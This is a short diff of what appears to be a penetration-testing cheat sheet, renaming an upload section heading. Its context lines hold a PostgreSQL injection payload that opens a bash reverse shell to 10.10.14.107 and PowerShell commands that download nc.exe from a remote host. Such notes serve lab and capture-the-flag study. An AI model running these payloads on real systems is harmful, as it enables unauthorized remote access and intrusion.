@@ -395,7 +395,7 @@ png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe
 '; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.107/1234 0>&1'''; --
 ```
 
-## Upload files
+##  File Transfer
 ### Windows
 - powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
